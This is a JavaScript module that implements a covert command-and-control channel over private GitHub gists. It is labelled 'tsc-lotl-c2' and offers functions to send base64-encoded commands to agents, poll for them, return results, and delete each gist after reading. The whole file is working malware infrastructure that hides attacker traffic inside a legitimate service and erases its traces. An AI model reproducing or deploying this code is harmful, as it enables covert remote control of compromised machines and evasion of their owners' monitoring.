const https = require('https');

class GitHub {
  constructor(config) {
    this.token = config.token;
    this.gistPrefix = config.gistPrefix || 'tsc-lotl-cmd-';
    this.apiBase = 'api.github.com';
  }

  _request(method, path, body) {
    return new Promise((resolve, reject) => {
      const opts = {
        hostname: this.apiBase,
        path,
        method,
        headers: {
          'Authorization': `Bearer ${this.token}`,
          'Content-Type': 'application/json',
          'User-Agent': 'tsc-lotl-c2'
        }
      };

      const req = https.request(opts, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
          try {
            const parsed = JSON.parse(data);
            if (res.statusCode >= 200 && res.statusCode < 300) {
              resolve(parsed);
            } else {
              reject(new Error(`GitHub API error ${res.statusCode}: ${JSON.stringify(parsed)}`));
            }
          } catch (e) {
            reject(new Error(`GitHub API error ${res.statusCode}: ${data}`));
          }
        });
      });

      req.on('error', reject);
      if (body) req.write(JSON.stringify(body));
      req.end();
    });
  }

  async sendCommand(agentId, b64Payload) {
    const filename = `${this.gistPrefix}${agentId}.json`;
    const description = `C2 command for ${agentId} | ${Date.now()}`;

    const gist = {
      description,
      public: false,
      files: {
        [filename]: {
          content: JSON.stringify({
            agentId,
            command: b64Payload,
            timestamp: new Date().toISOString()
          })
        }
      }
    };

    const result = await this._request('POST', '/gists', gist);
    return { id: result.id, url: result.html_url };
  }

  async pollCommands(agentId) {
    const gists = await this._request('GET', `/gists?per_page=100`);

    const matching = gists.filter(g =>
      g.files &&
      Object.keys(g.files).some(f => f.startsWith(this.gistPrefix + agentId))
    );

    const results = [];
    for (const gist of matching) {
      try {
        const gistDetail = await this._request('GET', `/gists/${gist.id}`);

        const fileKey = Object.keys(gistDetail.files).find(f =>
          f.startsWith(this.gistPrefix + agentId)
        );
        if (!fileKey) continue;

        const raw = gistDetail.files[fileKey].content;
        const parsed = JSON.parse(raw);

        results.push({
          id: gist.id,
          agentId: parsed.agentId,
          command: parsed.command,
          timestamp: parsed.timestamp
        });

        await this._request('DELETE', `/gists/${gist.id}`);
      } catch (e) {
        // skip
      }
    }
    return results;
  }

  async sendResult(agentId, b64Payload) {
    const filename = `${this.gistPrefix}result_${agentId}.json`;
    const description = `C2 result for ${agentId} | ${Date.now()}`;

    const gist = {
      description,
      public: false,
      files: {
        [filename]: {
          content: JSON.stringify({
            agentId,
            result: b64Payload,
            timestamp: new Date().toISOString()
          })
        }
      }
    };

    const result = await this._request('POST', '/gists', gist);
    return { id: result.id, url: result.html_url };
  }

  async pollResults(agentId) {
    try {
      const gists = await this._request('GET', `/gists?per_page=100`);
      const prefix = `${this.gistPrefix}result_${agentId}`;

      const matching = gists.filter(g =>
        g.files &&
        Object.keys(g.files).some(f => f.startsWith(prefix))
      );

      const results = [];
      for (const gist of matching) {
        try {
          const gistDetail = await this._request('GET', `/gists/${gist.id}`);
          const fileKey = Object.keys(gistDetail.files).find(f => f.startsWith(prefix));
          if (!fileKey) continue;

          const raw = gistDetail.files[fileKey].content;
          const parsed = JSON.parse(raw);
          results.push({
            id: gist.id,
            agentId: parsed.agentId,
            result: parsed.result,
            timestamp: parsed.timestamp
          });
          await this._request('DELETE', `/gists/${gist.id}`);
        } catch (e) {
          // skip
        }
      }
      return results;
    } catch (e) {
      return [];
    }
  }

  async test() {
    try {
      const user = await this._request('GET', '/user');
      return !!user.login;
    } catch {
      return false;
    }
  }
}

module.exports = GitHub;
